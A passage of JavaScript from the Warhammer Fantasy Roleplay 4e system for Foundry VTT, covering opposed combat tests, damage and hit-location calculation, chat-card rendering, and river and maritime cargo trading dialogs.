            soundContext.item = { type: "throw" };
            if (attackerTest.weapon.properties.qualities.hack) {
              soundContext.item = { type: "throw_axe" };
            }
          }
        }
        catch (e) { WFRP_Utility.log("Sound Context Error: " + e, true); } // Ignore sound errors
      }
      else // Defender won
      {
        try {
          if (attackerTest.weapon
            && (attackerTest.weapon.weaponGroup.value === "bow"
              || attackerTest.weapon.weaponGroup.value === "crossbow"
              || attackerTest.weapon.weaponGroup.value === "blackpowder"
              || attackerTest.weapon.weaponGroup.value === "engineering")) {
            soundContext = { item: attackerTest.weapon, action: "miss" };
          }
          if (defenderTest.weapon && defenderTest.weapon.properties.qualities.shield) {
            if (attackerTest.weapon.attackType == "melee") {
              soundContext = { item: { type: "shield" }, action: "miss_melee" };
            }
            else {
              if (attackerTest.weapon.weaponGroup.value === "bow"
                || attackerTest.weapon.weaponGroup.value === "sling"
                || attackerTest.weapon.weaponGroup.value === "throwing"
                || attackerTest.weapon.weaponGroup.value === "crossbow") {
                soundContext = { item: { type: "shield" }, action: "miss_ranged" };
              }
            }
          }
        }
        catch (e) { WFRP_Utility.log("Sound Context Error: " + e, true); } // Ignore sound errors

        opposeResult.winner = "defender";
        opposeResult.differenceSL = defenderSL - attackerSL;
      }

      await Promise.all(attacker.runScripts("opposedAttacker", { opposedTest: this, attackerTest, defenderTest }));
      await Promise.all(attackerTest.item?.runScripts?.("opposedAttacker", { opposedTest: this, attackerTest, defenderTest }) ?? []);
      if (defender) {
        await Promise.all(defender.runScripts("opposedDefender", { opposedTest: this, attackerTest, defenderTest}));
        await Promise.all(defenderTest.item?.runScripts?.("opposedDefender", { opposedTest: this, attackerTest, defenderTest }) ?? []);
      }

      Hooks.call("wfrp4e:opposedTestResult", this, attackerTest, defenderTest);
      WFRP_Audio.PlayContextAudio(soundContext);
      return opposeResult
    }
    catch (err) {
      ui.notifications.error(`${game.i18n.localize("ErrorOpposed")}: ` + err);
      console.error("Could not complete opposed test: " + err);
    }
  }

  async calculateOpposedDamage() {
    // Calculate size damage multiplier 
    let damageMultiplier = 1;
    let sizeDiff;
    let breakdown = {other : []};

    if (this.attackerTest.actor.type == "vehicle" || this.defenderTest.actor.type == "vehicle")
      sizeDiff = 0;
    else 
      sizeDiff = game.wfrp4e.config.actorSizeNums[this.attackerTest.size] - game.wfrp4e.config.actorSizeNums[this.defenderTest.size];

    if (this.attackerTest.actor.has(game.i18n.localize("NAME.Swarm")) || this.defenderTest.actor.has(game.i18n.localize("NAME.Swarm")))
      sizeDiff = 0;

    if (game.settings.get("wfrp4e", "mooSizeDamage"))
      sizeDiff = 0;

    damageMultiplier = sizeDiff >= 2 ? sizeDiff : 1;


    let opposedSL = Number(this.attackerTest.result.SL ?? 0) - Number(this.defenderTest.result.SL ?? 0);
    let item = this.attackerTest.item;

    if (item?.system.damage?.hasOwnProperty("addSL") && !item.system.damage.addSL)
    {
      opposedSL = 0;
    }

    let damage;
    if (this.attackerTest.useMount)
      damage = item.mountDamage;
    else
      damage = item.Damage;

    //@HOUSE
    if (game.settings.get("wfrp4e", "mooSLDamage")) {
      game.wfrp4e.utility.logHomebrew("mooSLDamage");
      opposedSL = Number(this.attackerTest.result.SL);
    }
    //@/HOUSE

    breakdown.base = damage + this.attackerTest.result.additionalDamage; 
    breakdown.opposedSL = opposedSL;

    // Winds of Magic overcast
    if (this.attackerTest instanceof WomCastTest) {	
      damage += (this.attackerTest.result.additionalDamage || 0);	
    } else {	
      damage += (opposedSL + (this.attackerTest.result.additionalDamage || 0));	
    }

    //@HOUSE
    if (game.settings.get("wfrp4e", "mooRangedDamage"))
    {
      game.wfrp4e.utility.logHomebrew("mooRangedDamage");
      if (this.attackerTest.item && this.attackerTest.item.isRanged)
      {
        damage -= (Math.floor(this.attackerTest.targetModifiers / 10) || 0);
        if (damage < 0)
          damage = 0;
      }
    }
    //@/HOUSE



    let effectArgs = { damage, damageMultiplier, sizeDiff, opposedTest: this, addDamaging : false, addImpact : false, breakdown };
    await Promise.all(this.attackerTest.actor.runScripts("calculateOpposedDamage", effectArgs));
    await Promise.all(this.attackerTest.item?.runScripts("calculateOpposedDamage", effectArgs));
    ({ damage, damageMultiplier, sizeDiff } = effectArgs);

    let addDamaging = effectArgs.addDamaging || false;
    let addImpact = effectArgs.addImpact || false;
    if (this.attackerTest.trait) {
      if (sizeDiff >= 1)
        addDamaging = true;
      if (sizeDiff >= 2)
        addImpact = true;
    }

    let hasDamaging = false;
    let hasImpact = false;
    if (this.attackerTest.item.properties) {
      hasDamaging = this.attackerTest.item.properties.qualities.damaging;
      hasImpact = this.attackerTest.item.properties.qualities.impact;

      if (this.attackerTest.item.properties.qualities.hullbreaker && this.defender.type == "vehicle")
      {
        addDamaging = true;
        damage += 2;
        breakdown.other.push({label : game.i18n.localize("PROPERTY.Hullbreaker"), value : 2});
      }

      if (this.attackerTest.result.charging || !this.attackerTest.item.properties.flaws.tiring) {
        if (hasDamaging)
          addDamaging = true;
        if (hasImpact)
          addImpact = true;
      }

      if (sizeDiff >= 1)
        addDamaging = true;
      if (sizeDiff >= 2)
        addImpact = true;
    }

    if (addDamaging) {
      let unitValue = Number(this.attackerTest.result.roll.toString().split("").pop());
      if (unitValue === 0)
        unitValue = 10;

      if (unitValue > opposedSL) {
        breakdown.damaging = unitValue;
        damage = damage - opposedSL + unitValue; // replace opposedSL with unit value
      }
    }
    if (addImpact) {
      let unitValue = Number(this.attackerTest.result.roll.toString().split("").pop());
      if (unitValue === 0)
        unitValue = 10;
      damage += unitValue;
      breakdown.impact = unitValue;
    }
    this.result.damaging = hasDamaging || addDamaging;
    this.result.impact = hasImpact || addImpact;

    breakdown.multiplier = damageMultiplier;
    this.result.breakdown = breakdown;
    return damage * damageMultiplier
  }

  async findHitLocation()
  {
      // If an attacker's test hit location is "rArm" this actually means "primary arm"
      // So convert "rArm" to "rArm" or "lArm" depending on the actor's settings 
      let attackerHitloc = foundry.utils.deepClone(this.attackerTest.hitloc);
      attackerHitloc.result = this.defender.convertHitLoc(attackerHitloc.result);
      attackerHitloc.description = game.wfrp4e.config.locations[attackerHitloc.result];

      let hitlocToUse;

      // Remap the hit location roll to the defender's hit location table, note the change if it is different
      let remappedHitLoc = await game.wfrp4e.tables.rollTable(this.defender.details.hitLocationTable.value, { lookup: attackerHitloc.roll, hideDSN: true });
      if (remappedHitLoc)
      {
        if (remappedHitLoc.result != attackerHitloc.result) {
          remappedHitLoc.description = game.i18n.localize(remappedHitLoc.description) + " (Remapped)";
          remappedHitLoc.remapped = true;
        }
        hitlocToUse = remappedHitLoc;
      }
      else
      {
        hitlocToUse = attackerHitloc;
      }

      this.result.hitloc = {
        description: `<b>${game.i18n.localize("ROLL.HitLocation")}</b>: ${hitlocToUse.description}`,
        value: hitlocToUse.result
      };
  }

  async swap(label)
  {
      let temp = foundry.utils.duplicate(this.defenderTest.data);
      this.defenderTest = game.wfrp4e.rolls.TestWFRP.recreate(this.attackerTest.data);
      this.attackerTest = game.wfrp4e.rolls.TestWFRP.recreate(temp);
      this.data.attackerTestData = this.attackerTest.data;
      this.data.defenderTestData = this.defenderTest.data;
      let damage = await this.calculateOpposedDamage();
      this.result.damage = {
        description: `<b>${game.i18n.localize("Damage")} (${label})</b>: ${damage}`,
        value: damage
      };
      await this.findHitLocation();
      this.result.swapped = true;
  }

  formatBreakdown()
  {
    let string = "";
    try 
    {
      let breakdown = this.result.breakdown;
      let accumulator = Number(breakdown.base);

      string += `<p><strong>${game.i18n.localize("BREAKDOWN.AttackerBase")}</strong>: ${breakdown.base}</p>`;
      if (breakdown.damaging) 
      {
        accumulator += Number(breakdown.damaging);
        string += `<p><strong>${game.i18n.localize("PROPERTY.Damaging")}</strong>: +${breakdown.damaging} (${accumulator})</p>`;
      }
      else if (breakdown.opposedSL) 
      {
        accumulator += Number(breakdown.opposedSL);
        string += `<p><strong>${game.i18n.localize("BREAKDOWN.OpposedSL")}</strong>: +${breakdown.opposedSL} (${accumulator})</p>`;
      }
      if (breakdown.impact) 
      {
        accumulator += Number(breakdown.impact);
        string += `<p><strong>${game.i18n.localize("PROPERTY.Impact")}</strong>: +${breakdown.impact} (${accumulator})</p>`;
      }

      for (let source of breakdown.other) 
      {
        accumulator += Number(source.value);
        string += `<p><strong>${source.label}</strong>: ${HandlebarsHelpers.numberFormat(source.value, { hash: { sign: true } })} (${accumulator})</p>`;
      }

      if (breakdown.multiplier > 1) 
      {
        accumulator *= breakdown.multiplier;
        string += `<p><strong>${game.i18n.localize("BREAKDOWN.Multiplier")}</strong>: ×${breakdown.multiplier} (${accumulator})</p>`;
      }
    }
    catch (e) 
    {
      console.error(`Error generating formatted breakdown: ${e}`, this);
    }

    return string;
  }

}

/**
 * Represents an opposed test. This object is stored in the "targeting" messages and is used as a central manager of a single opposed test.
 * - Stores targeting message id, attacker message id, defender message id, and result message ID
 * - Actors who have been targeted are flagged with the targeting message ID (messageId)
 * - @see TestWFRP - Tests have a list of opposedMessageIds, that being messageId
 **/
class OpposedWFRP {

  constructor(data = {}) {
    this.data = {
      messageId: data.messageId,
      attackerMessageId: data.attackerMessageId,
      defenderMessageId: data.defenderMessageId,
      resultMessageId: data.resultMessageId,
      targetSpeakerData: data.targetSpeakerData,
      options: data.options || {},
      unopposed: data.unopposed
    };
  }

  get message() {
    return game.messages.get(this.data.messageId);
  }

  get resultMessage() {
    return game.messages.get(this.data.resultMessageId);
  }

  get target() {
    return WFRP_Utility.getToken(this.data.targetSpeakerData);
  }

  get attackerMessage() {
    return game.messages.get(this.data.attackerMessageId);
  }

  get defenderMessage() {
    return game.messages.get(this.data.defenderMessageId);
  }

  get attackerTest() {
    return this.attackerMessage?.getTest();
  }

  get defenderTest() {
    if (this.unopposed) {
      return new game.wfrp4e.rolls.CharacteristicTest({
        item: "ws",
        SL: 0,
        target: 0,
        roll: 0,
        unopposed: true,
      }, this.target.actor)
    }
    else
      return this.defenderMessage?.getTest();
  }

  get attacker() {
    return this.attackerTest?.actor
  }

  get defender() {
    return this.defenderTest ? this.defenderTest.actor : WFRP_Utility.getSpeaker(this.data.targetSpeakerData) // If opposed test isn't complete, use targetSPeakerData
  }

  get options() {
    return this.data.options;
  }

  get unopposed() {
    return this.data.unopposed;
  }

  async startOppose(targetToken) {
    this.data.targetSpeakerData = targetToken.actor.speakerData(targetToken);
    await this.renderOpposedStart();
    await this._addOpposeFlagsToDefender(targetToken);
    return this.message?.id
  }

  async setAttacker(message) {
    this.data.attackerMessageId = typeof message == "string" ? message : message.id;
    this.data.options = {
      whisper: message.whisper,
      blind: message.blind
    };
    if (this.message)
      await this.updateMessageFlags();
  }

  async setDefender(message) {
    this.data.defenderMessageId = typeof message == "string" ? message : message.id;
    if (this.message)
      await this.updateMessageFlags();
  }

  async computeOpposeResult() {
    if (!this.attackerTest || !this.defenderTest)
      throw new Error(game.i18n.localize("ERROR.Opposed"))

    this.opposedTest = new OpposedTest(this.attackerTest, this.defenderTest);

    await this.opposedTest.evaluate();
    this.formatOpposedResult();
    await this.renderOpposedResult();
    await this.colorWinnerAndLoser();
  }

  async renderOpposedStart() {
    let attacker = game.canvas.tokens.get(this.attackerTest.context.chatOptions.speaker.token)?.document ?? this.attacker.prototypeToken;
    let defender;

    // Support opposed start messages when defender is not set yet - allows for manual opposed to use this message
    if (this.target)
      defender = this.target;
    else if (this.defenderTest)
      defender = WFRP_Utility.getToken(this.defenderTest.context.speaker) || this.defender.prototypeToken;

    let defenderImg = defender ? `<a class = "defender"><img src="${defender.texture.src}" width="50" height="50"/></a>` : `<a class = "defender"><img width="50" height="50"/></a>`;

    let content =
        `<div class ="opposed-message">
            ${game.i18n.format("ROLL.Targeting", {attacker: ((attacker.hidden) ? "???" : attacker.name), defender: defender ? defender.name : "???"})}
          </div>
          <div class = "opposed-tokens">
          <a class = "attacker"><img src="${((attacker.hidden) ? "systems/wfrp4e/tokens/unknown.png" : attacker.texture.src)}" width="50" height="50"/></a>
          ${defenderImg}
          </div>
          <div class="opposed-options">
            ${this.getOpposedOptions(defender?.actor)}
          </div>`;

    // Ranged weapon opposed tests automatically lose no matter what if the test itself fails
    if (this.attackerTest.item && this.attackerTest.item.isRanged && this.attackerTest.failed) {
      await ChatMessage.create({ speaker: this.attackerMessage.speaker, content: game.i18n.localize("OPPOSED.FailedRanged") });
      return;
    }
    let chatData = {
        user: game.user.id,
        content: content,
        speaker: { alias: game.i18n.localize("CHAT.OpposedTest") },
        whisper: this.options.whisper,
        blind: this.options.blind,
        "flags.wfrp4e.opposeData": this.data
    };

    if (this.message) {
        await this.message.update(chatData);
        return this.data.messageId;
    }
    else {
        // Create the Opposed starting message
        let msg = await ChatMessage.create(chatData);
        this.data.messageId = msg.id;
        await this.updateMessageFlags();
        return msg.id;
    }
  }

  getOpposedOptions(actor)
  {
    let unopposed = `<a class="unopposed" data-tooltip="${game.i18n.localize("Unopposed")}"><i class="fas fa-arrow-down"></i></a>`;
    let weapon;
    let offhand;
    let trait;
    let dodge = `<a class="oppose" data-item-id="dodge" data-tooltip="${game.i18n.localize("NAME.Dodge")}"><i class="fas fa-reply"></i></a>`;

    if (actor)
    {
      // Use first weapon equipped
      let mainWeapon = actor.itemTypes.weapon.find(i => i.system.isMelee && i.system.isEquipped && !i.system.offhand.value);
      let offhandWeapon = actor.itemTypes.weapon.find(i => i.system.isMelee && i.system.isEquipped && i.system.offhand.value);
      let firstTrait = actor.itemTypes.trait.find(i => i.system.isMelee);

      if (mainWeapon)
      {
        weapon = `<a class="oppose" data-item-id="${mainWeapon.id}" data-tooltip="${mainWeapon.name}"><i class="fa-solid fa-sword"></i></a>`;
      }
      if (offhandWeapon)
      {
        offhand = `<a class="oppose" data-item-id="${offhandWeapon.id}" data-tooltip="${game.i18n.localize("SHEET.Offhand") + ` (${offhandWeapon.name})`}"><i class="fa-solid fa-shield"></i></a>`;
      }
      if (firstTrait)
      {
        trait = `<a class="oppose" data-item-id="${firstTrait.id}" data-tooltip="${firstTrait.DisplayName}"><i class="fa-solid fa-paw-claws"></i></a>`;
      }
    }

    return [dodge, trait, weapon, offhand, unopposed].filter(i => i).join("")
  }

  async updateMessageFlags() {
    let updateData = { "flags.wfrp4e.opposeData": this.data };
    if (this.message && game.user.isGM) {
      await this.message.update(updateData);
    }
    else if (this.message) {
      await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData });
    }
  }



  async renderOpposedResult() {
    let opposeData = this.opposedTest.data;
    let opposeResult = this.opposedTest.result;
    let options = this.options;
    opposeResult.hideData = true;
    let html = await renderTemplate("systems/wfrp4e/templates/chat/roll/opposed-result.hbs", opposeResult);
    let chatOptions = {
      user: game.user.id,
      content: html,
      "flags.wfrp4e.opposeTestData": opposeData,
      "flags.wfrp4e.opposeId": this.message.id,
      whisper: options.whisper,
      blind: options.blind,
    };
    let msg = await ChatMessage.create(chatOptions);
    this.data.resultMessageId = msg.id;
    await this.updateMessageFlags();
  }

  formatOpposedResult() {

    let opposeResult = this.opposedTest.opposeResult;
    let attackerAlias = this.attackerTest.message.speaker.alias;

    // Account for unopposed tests not having a defender message
    let defenderAlias = this.defenderMessage ? this.defenderMessage.speaker.alias : this.defenderTest.actor.prototypeToken.name;

    if (opposeResult.winner == "attacker") {
      opposeResult.result = game.i18n.format("OPPOSED.AttackerWins", {
        attacker: attackerAlias,
        defender: defenderAlias,
        SL: opposeResult.differenceSL
      });
      opposeResult.img = this.attackerMessage.flags.img;
    }
    else if (opposeResult.winner == "defender") {
      opposeResult.result = game.i18n.format("OPPOSED.DefenderWins", {
        defender: defenderAlias,
        attacker: attackerAlias,
        SL: opposeResult.differenceSL
      });
      opposeResult.img = this.defenderMessage ? this.defenderMessage.flags.img : this.defenderTest.actor.prototypeToken.texture.src;
    }

    return opposeResult;
  }

  async colorWinnerAndLoser() 
  {
    try {
      let winner = this.opposedTest.opposeResult.winner;

      // The loser is "attacker" or "defender"
      let loser = winner == "attacker" ? "defender" : "attacker";

      // Replace "attacker" with "attacker winner" or "defender" with "defender winner" to apply the color coded borders
      let content = this.message.content;
      content = content.replace(winner, `${winner} winner`);
      content = content.replace(loser, `${loser} loser`);

      if (!game.user.isGM)
        await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData: {content} });
      else
        await this.message.update({content});
    }
    catch(e) {
      console.error(`Error color coding winner and loser: ${e}`);
    }
  }


  async _addOpposeFlagsToDefender(target) {
    if (!game.user.isGM) {
      const payload = {
        target: target.id,
        scene: canvas.scene.id,
        opposeFlag: { opposeMessageId: this.data.messageId }
      };
      await game.wfrp4e.socket.executeOnUserAndWait("GM", "target", payload);
    }
    else {
      // Add oppose data flag to the target
      await target.actor.update({ "flags.oppose": { opposeMessageId: this.data.messageId } });
    }
  }

  /**
 * The opposed button was clicked, evaluate whether it is an attacker or defender, then proceed
 * to evaluate if necessary.
 * 
 * @param {Object} event Click event for opposed button click
 */
  static async opposedClicked(event) {
    let button = $(event.currentTarget),
      messageId = button.parents('.message').attr("data-message-id"),
      message = game.messages.get(messageId);

    if (game.wfrp4e.oppose && !game.wfrp4e.oppose.attackerMessage) {
      delete game.wfrp4e.oppose;
    }

    // Opposition already exists - click was defender
    if (game.wfrp4e.oppose) {
      await game.wfrp4e.oppose.setDefender(message);
      await game.wfrp4e.oppose.renderOpposedStart(); // Rerender opposed start with new message
      await game.wfrp4e.oppose.computeOpposeResult();
      delete game.wfrp4e.oppose;
    }
    // No opposition - click was attacker
    else {
      game.wfrp4e.oppose = new OpposedWFRP();
      await game.wfrp4e.oppose.setAttacker(message);
      await game.wfrp4e.oppose.renderOpposedStart();
    }
  }


  async resolveUnopposed() {
    this.data.unopposed = true;
    await this.computeOpposeResult();
    await this.defender.clearOpposed();
  }

  async resolveOpposed(id)
  {
    if (this.defender)
    {
      let test;
      if (id == "dodge")
      {
        test = await this.defender.setupSkill(game.i18n.localize("NAME.Dodge"), {skipTargets: true});
      }
      else 
      {
        test = await this.defender.setupItem(id, {skipTargets: true});
      }
      test?.roll();
    }
  }
  // Update starting message with result
  static async updateOpposedMessage(damageConfirmation, messageId) {
    let resultMessage = game.messages.get(messageId);
    let rollMode = resultMessage.rollMode;

    let msg = $(resultMessage.content).append(`<div>${damageConfirmation}</div>`);

    msg.find(".apply-damage").remove();

    let newCard = {
      user: game.user.id,
      rollMode: rollMode,
      hideData: true,
      content: msg.html()
    };
    
    await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: messageId, updateData: newCard });
  }
}

// Old code
/************************************************************************************/
class CargoDialog extends Dialog {

  /* -------------------------------------------- */
  constructor(html, cargoData) {
    let myButtons = {
      cargoButton: {
        label: game.i18n.localize("TRADE.CreateCargoItem"),
        callback: html => this.createCargoItem(html)
      },
      cancelButton: {
        label: game.i18n.localize("TRADE.Cancel"),
        callback: html => this.close()
      },
    };
    // Common conf
    let dialogConf = {
      content: html,
      buttons: myButtons,
      default: "cargoButton"
    };
    let dialogOptions = { classes: ["dialog"] };

    dialogConf.title = "Manage Trade",
    dialogOptions.width = 340;
    dialogOptions.height = 260;
    super(dialogConf, dialogOptions);

    this.cargoData = cargoData;
  }

  /* -------------------------------------------- */
  async createCargoItem(html, divider=1) {
    this.cargoData.system.encumbrance.value = parseInt($("#cargo-size").val());
    let cargoDiscount = parseInt($("#cargo-discount").val());
    this.cargoData.system.price.gc = this.cargoData.system.encumbrance.value / (this.cargoData.system.tradeType == "river" ? 10 : 1) * parseFloat(this.cargoData.system.unitPrice.value) * (1.0 + (cargoDiscount / 100));
    let message =
      `${game.i18n.format("TRADE.MerchantDataBuy", {cargoName : this.cargoData.name, cargoSize : this.cargoData.system.encumbrance.value, cargoPrice : this.cargoData.system.price.gc })}<br>
   <span class="chat-card-button-area">
   <a class='chat-card-button market-button trade-buy-click' data-button='buyTrade'>${game.i18n.localize("TRADE.BuyCargo")}</a>
   </span>`;

    let messageData = game.wfrp4e.utility.chatDataSetup(message);
    messageData["flags.wfrp4e.cargoData"] = this.cargoData;
    ChatMessage.create(messageData);
  }

  /* -------------------------------------------- */
  activateListeners(html) {
    super.activateListeners(html);

    // Get the rollData stuff
    this.cargoData;

    // Update from quantity!
    html.on('change', '#cargo-size', event => {
      let discount = Number($("#cargo-discount").val());
      let newSize = Number(event.currentTarget.value);
      let newPrice = newSize / 10 * this.cargoData.system.unitPrice.value * (1.0 + (discount / 100));
      $("#cargo-price").val(newPrice);
    });
    // Update from discount!
    html.on('change', '#cargo-discount', event => {
      let discount = Number(event.currentTarget.value);
      let newSize = Number($("#cargo-size").val());
      let newPrice = newSize / 10 * this.cargoData.system.unitPrice.value * (1.0 + (discount / 100));
      $("#cargo-price").val(newPrice);
    });
  }

}

/************************************************************************************/
class TradeDialog extends Dialog {

    constructor(cargo, gazetteer, tradeType, resolve)
    {
        let dialogContent = {
          title : game.i18n.localize("TRADE.SettlementDetails"),
          buttons : {
            ok : {
              label : "Ok",
              callback : (dlg) => {
                let settlementData = {};
  
                let settlementIndex = dlg.find('[name="settlement"]').val();
                let season = dlg.find('[name="season"]').val();
                if (Number.isNumeric(settlementIndex))
                {
                  let selected = this.gazetteer[Number(settlementIndex)];
                  settlementData = {
                    wealth : Number(selected.w),
                    size : Number(selected),
                    trade : selected.isTrade,
                    produces : selected.produces,
                    season
                  };
                }
                settlementData.name = dlg.find('[name="name"]').val();
                settlementData.wealth = Number(dlg.find('[name="wealth"]').val());
                settlementData.size = Number(dlg.find('[name="size"]').val());
                settlementData.trade = dlg.find('[name="trade"]').is(':checked');
                settlementData.season = season;
                settlementData.produces = dlg.find('[name="produces"]').val().split(",").map(i=> {
                  i = i.trim();
                  return game.wfrp4e.utility.findKey(i.split("(")[0].trim(), game.wfrp4e.trade.tradeData[tradeType].cargoTypes)
                }).filter(i => !!i);

                settlementData.surplus = this.encodeSurplusDemand(dlg.find('[name="surplus"]').val());
                settlementData.demand = this.encodeSurplusDemand(dlg.find('[name="demand"]').val());

                resolve(settlementData);
              }
            }
          }
        };
        super(dialogContent);

        if (game.modules.get("foundryvtt-simple-calendar")?.active) 
        {
            this.season = SimpleCalendar.api.getCurrentSeason();
            if (this.season == "fall")
            {
                this.season = "autumn";
            }
        }
        this.tradeType = tradeType;
        this.cargo = cargo;
        this.gazetteer = gazetteer;
    }
  
  
    static get defaultOptions() {
        return foundry.utils.mergeObject(super.defaultOptions, {
          template: "systems/wfrp4e/templates/apps/trade/trade-dialog.hbs",
      });
    }
  
    getData() {
      let data = super.getData();
      data.cargo = this.cargoData;
      data.gazetteer = this.gazetteer;
      data.tradeType = this.tradeType;
      data.seasons = game.wfrp4e.trade.seasons;
      return data
    }
  
    /* -------------------------------------------- */
    activateListeners(html) {
      super.activateListeners(html);
  
      this.settlement = html.find("#settlement").change(ev => {
        if (ev.target.value != "")
        {
          let index = Number(ev.target.value);
          this.wealth.value = this.gazetteer[index].w;
          this.size.value = this.gazetteer[index].size;
          this.produces.value = this.gazetteer[index].produces.map(i => this.formatCargoType(i) || i).join(", ");
          if (this.surplus)
          {
            this.surplus.value = this.formatSurplusDemand(this.gazetteer[index].surplus);
          }
          if (this.demand)
          {
            this.demand.value = this.formatSurplusDemand(this.gazetteer[index].demand);
          }
          this.trade.checked = this.gazetteer[index].isTrade;
          this.name.value = this.gazetteer[index].name;
        }
      })[0];
  
      this.wealth = html.find("#wealth").change(ev => {
        this.settlement.value = "";
      })[0];
  
      this.size = html.find("#size").change(ev => {
        this.settlement.value = "";
      })[0];
  
      this.produces = html.find("#produces").change(ev => {
        this.settlement.value = "";
      })[0];
  
      this.surplus = html.find("#surplus").change(ev => {
        this.settlement.value = "";
      })[0];

      this.demand = html.find("#demand").change(ev => {
        this.settlement.value = "";
      })[0];

      this.trade = html.find("#trade").change(ev => {
        this.settlement.value = "";
      })[0];
  
      this.name = html.find("#name").change(ev => {
        this.settlement.value = "";
      })[0];

    }


    // This is all really gross but I don't have time to clean it up right now
    formatCargoType(string)
    {
      if (string.includes("("))
      {
        let parenthesesValue = string.split("(")[1].split(")")[0];
        let name = string.split("(")[0].trim(0);
        return `${game.wfrp4e.trade.tradeData[this.tradeType].cargoTypes[name]} (${parenthesesValue})`;
      }
      else 
      {
        return game.wfrp4e.trade.tradeData[this.tradeType].cargoTypes[string]
      }
    }

    formatSurplusDemand(values)
    {
      if (values?.length)
      {
        let strings = [];
        for(let text of values)
        {
          let [name, value]= text.split("+").map(i => i.trim());
          name = this.formatCargoType(name);
          
          strings.push(`${name} +${value}`);
          
        }
        return strings.join(", ");
      }
      else return "";
    }

    encodeSurplusDemand(string)
    {
      if (!string)
      {
        return [];
      }
      let encoded = [];
      let strings = string.split(",").map(i => i.trim());

      for(let string of strings)
      {
        let value = string.split("+")[1].trim();
        let key;
        if (string.includes("("))
        {
          key = string.split("(")[0].trim();
          string.split("(")[1].split(")")[0];
        }
        else 
        {
          key = game.wfrp4e.utility.findKey(string.split("+")[0].trim(), game.wfrp4e.trade.tradeData[this.tradeType].cargoTypes);
        }

        encoded.push(`${key} +${value}`);
      }
      return encoded;

    }
  }

let d100 = () => Math.ceil(CONFIG.Dice.randomUniform() * 100);
let d20 = () => Math.ceil(CONFIG.Dice.randomUniform() * 20);
let d10 = () => Math.ceil(CONFIG.Dice.randomUniform() * 10);
class TradeGenerator
{

    constructor(settlement, tradeType)
    {
        this.settlement = settlement;
        this.tradeData = null;
        this.rolls = [];
        this.tradeType = tradeType;
    }

    async attemptTrade()
    {
        if (this.tradeType == "river")
        {
            return this.attemptRiverTrade();
        }
        else if (this.tradeType == "maritime")
        {
            return this.attemptMaritimeTrade();
        }
    }

    //#region River Trading

    async attemptRiverTrade()
    {
        let cargoAvailable = this.rollForCargoRiver();

        if (cargoAvailable)
        {
            let merchant = await this.createMerchant();
            let item = await this.createCargoItem(cargoAvailable, merchant);
            this.createCargoMessage(item, this.tradeData);
        }
        else 
        {
            ChatMessage.create({content : game.i18n.format("TRADE.NoCargoFound", {town : this.settlement.name, rolls: this.rolls.join(", ")})});
        }
    }

    rollForCargoRiver()
    {
        let available = [];

        let target = (this.settlement.wealth + this.settlement.size) * 10;
        if (this.settlement.produces.length)
        {
            let roll = d100();
            this.rolls.push(roll);
            if (roll <= target)
            {
                available = available.concat(this.settlement.produces);
            }
        }
        if (this.settlement.trade)
        {
            let roll = d100();
            this.rolls.push(roll);
            if (roll <= target)
            {
                available = available.concat(this.randomCargo(this.settlement.season));
            }
        }
        return available[Math.floor(CONFIG.Dice.randomUniform() * available.length)];
    }

    
    attemptSell(cargo)
    {
        let message;
        let price = Number(cargo.system.price.gc);
    
        let targetScore = (this.settlement.size * 10) + ((this.settlement.trade) ? 30 : 0);
        let score1 = d100();
        let score2 = d100();
    
        if (this.settlement.produces.includes(cargo.system.cargoType.value))
        {
            message = "This good is already produced at <b>" + this.settlement.name + "</b>";
        }
        else if (cargo.system.origin.value == this.settlement.name)
        {
            message = "You cannot sell cargo in the same settlement you bought it from.";
        }
        else if (score1 <= targetScore) 
        {
          let sellPrice = price + (price * game.wfrp4e.trade.tradeData[this.tradeType].wealthAvailability[this.settlement.wealth].offered);
          sellPrice += sellPrice * ((d20() - 10) / 100);
          sellPrice = Math.round(sellPrice);
          message = "A merchant is willing to buy the whole cargo for " + `<a class="money-drag" data-amt="${sellPrice}g"><strong>${sellPrice} GC</strong></a>`;
        } 
        else if (score2 <= targetScore) 
        {
          let sellPrice = price / 2 + (price / 2 * game.wfrp4e.trade.tradeData[this.tradeType].wealthAvailability[this.settlement.wealth].offered);
          sellPrice += sellPrice * ((d20() - 10) / 100);
          sellPrice = Math.round(sellPrice);
          message = "A merchant is willing to buy half the size of the cargo for " + `<a class="money-drag" data-amt="${sellPrice}g"><strong>${sellPrice} GC</strong</a>`;
        } 
        else 
        {
          message = "You cannot find anyone who wants to buy this cargo in <b>" + this.settlement.name + "</b>";
        }
        return ChatMessage.create(game.wfrp4e.utility.chatDataSetup(message));
    }

    async createCargoItem(cargoKey, merchant)
    {
        let size = this._computeSize();
        let {price, quality} = await this._computePriceQuality(cargoKey);

        let name = "TRADE." + cargoKey.capitalize(); // Auto-build tanslation key
        this.tradeData = { name: game.i18n.localize(name), town: this.settlement.name.capitalize(), merchant};

        let itemData = { system: foundry.utils.duplicate(game.system.model.Item.cargo) };
        itemData.name = game.i18n.format("TRADE.CargoItemName", { name: this.tradeData.name });
        itemData.system.cargoType.value = cargoKey;
        itemData.system.origin.value = this.tradeData.town;
        itemData.system.unitPrice.value = price;
        itemData.system.price.gc = price * (size / 10);
        itemData.system.quality.value = quality;
        itemData.system.description.value = `<p>${game.i18n.format("TRADE.CargoDescr", { name : merchant.name, town: this.tradeData.town })}</p>`;
        itemData.system.encumbrance.value = size;
        itemData.system.tradeType = this.tradeType;

        return itemData
    }


    //#endregion

    //#region Maritime Trading
    async attemptMaritimeTrade()
    {
        let cargoAvailable = this.getMaritimeCargo();
        let items = await this.createMaritimeCargoItems(cargoAvailable);
        if (items.length == 0)
        {
            ChatMessage.create({content : game.i18n.format("TRADE.NoCargoFound", {town : this.settlement.name, rolls: this.rolls.join(", ")})});
        }
    }

    getMaritimeCargo()
    {
        let available = [];

        for (let good of this.settlement.produces)
        {
            available.push(good);
        }

        for (let good of this.settlement.surplus)
        {
            available.push(good.split("+")[0].trim());
        }

        if (this.settlement.trade)
        {
            available.push(this.randomCargo());
        }
        return available;
    }

    attemptSellMaritime(cargo, far)
    {
        let message;
        let rollMessage;
        let price = Number(cargo.system.price.gc);

        let produces = this.settlement.produces.includes(cargo.system.cargoType.value);
        let surplus = Number(this.settlement.surplus.find(i => i.split("+")[0].trim() == cargo.system.cargoType.value)?.split("+")[1]) || 0;
